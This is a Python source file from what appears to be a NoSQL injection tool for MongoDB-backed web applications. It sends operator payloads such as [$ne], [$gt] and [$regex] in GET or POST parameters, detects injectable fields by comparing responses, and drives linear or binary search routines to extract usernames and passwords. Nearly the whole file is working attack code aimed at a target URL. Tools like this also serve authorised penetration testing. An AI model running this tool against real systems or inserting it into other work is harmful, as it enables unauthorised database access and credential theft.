import requests
import urllib3
import urllib
from _helper import *
import random
import string
from requests_html import HTMLSession
from termcolor import colored
import time
import algos.linear as linear
import algos.binary as binary

try:
    from BeautifulSoup import BeautifulSoup
except ImportError:
    from bs4 import BeautifulSoup
urllib3.disable_warnings()


def vulnTest(nsi):
    arr = ["[$ne]", "[$gt]"]
    x = Str.randStr(8)
    phaseTest = None
    session = HTMLSession()
    vulnerable = []

    for v in arr:
        phaseTest = v
        form_data = {}
        for element in nsi.params:
            element = element.replace("*", "")

            if ":" in element:
                element = element.split(":")[0]
            if v == "[$gt]":
                form_data[element + v] = "&"
            else:
                form_data[element + v] = x

        if nsi.reqMethod == "1":  # get
            reqData = Str.http_build_query(form_data)
            r = session.get(nsi.url)
            rInj = session.get(nsi.url + "?" + reqData)
        else:
            r = requests.post(nsi.url)
            rInj = session.post(nsi.url, data=form_data)
            # print("ori:"+r.text)
            # print("inj:"+rInj.text)

        resOri = BeautifulSoup(r.text, "lxml")
        resInj = BeautifulSoup(rInj.text, "lxml")
        # print(resOri.body)
        if resOri.body == resInj.body:
            vulnerable.append({v: False})
            print(colored(f"Not vulnerable with {phaseTest} Injection", "red"))
        else:
            vulnerable.append({v: True})
            nsi.successIdentifier = rInj.text
            print(colored(f"Possible vulnerable to {phaseTest} Injection!", "green"))

    return vulnerable


def isVulnerable(arr):
    for item in arr:
        if True in item.values():
            return True
    else:
        return False


def typeReqPayload(nsi):
    print(nsi.info())
    print(
        colored(
            "\n=================\n[Request Method]\n\n1) Send Request as GET\n2) Send Request as POST\n",
            "yellow",
        )
    )
    nsi.reqMethod = input("Choose Request Method >>")
    return nsi.reqMethod


def paramMenu(nsi):
    print(nsi.info())
    print(
        colored(
            f"\n=================\n[Dump Type]\n\n1) Dump data without known value\n2) Dump data by known value\n",
            "yellow",
        )
    )

    nsi.typeParam = input("Choose One >>")
    msg = "Input Param>>"
    if nsi.typeParam == "2":
        msg = "Input Param (separate with colon ex -> key:value)>>"

    while nsi.param != "d":
        print('press "d" for submit the param')
        nsi.param = input(msg)

        if nsi.param != "d":
            nsi.params.append(nsi.param)
    return nsi.typeParam


def algMenu(nsi):
    print(nsi.info())
    print(
        colored(
            "\n=================\n[Choose Algorithm]\n\n1) Linear Search\n2) Binary Search\n",
            "yellow",
        )
    )
    nsi.alg = input("Choose Algorithm >>")
    return nsi.alg


def slinear(nsi):
    password = ""
    # length = ""
    form_data = {}

    for element in nsi.params:
        if "*" in element:
            element = element.replace("*", "")
            form_data[element + "[$regex]"] = ""
        elif ":" in element:
            element = element.split(":")
            form_data[element[0] + "[$eq]"] = element[1]
        else:
            form_data[element + "[$ne]"] = "."

    if nsi.typeParam == "2":  # known value
        linear.dumpKnownValue(nsi, form_data, password)
    else:  # unknown value (dump usernames or passwords)
        linear.getPrefix(nsi, form_data)


def sbin(nsi):
    password = ""
    form_data = {}

    for element in nsi.params:
        if "*" in element:
            element = element.replace("*", "")
            form_data[element + "[$regex]"] = ""
        elif ":" in element:
            element = element.split(":")
            form_data[element[0] + "[$eq]"] = element[1]
        else:
            form_data[element + "[$ne]"] = "."

    if nsi.typeParam == "2":  # known value
        binary.dumpKnownValue(nsi, form_data, password)
    else:  # unknown value (dump usernames or passwords)
        binary.getPrefix(nsi, form_data)


def getResponseBodyHandlingErrors(req):
    try:
        responseBody = urllib3.urlopen(req).read()
    except urllib3.HTTPError as err:
        responseBody = err.read()

    return responseBody

def checkWeb(url):
    print("Checking to see if site at " + str(url).strip() + " is up...")
    tester = WebAppTester(url)
    if tester.is_up():
        print(colored("✓ The target is up. Starting injection test !", "green"))
    else:
        print(colored("The target is might be down", "red"))
    return 0
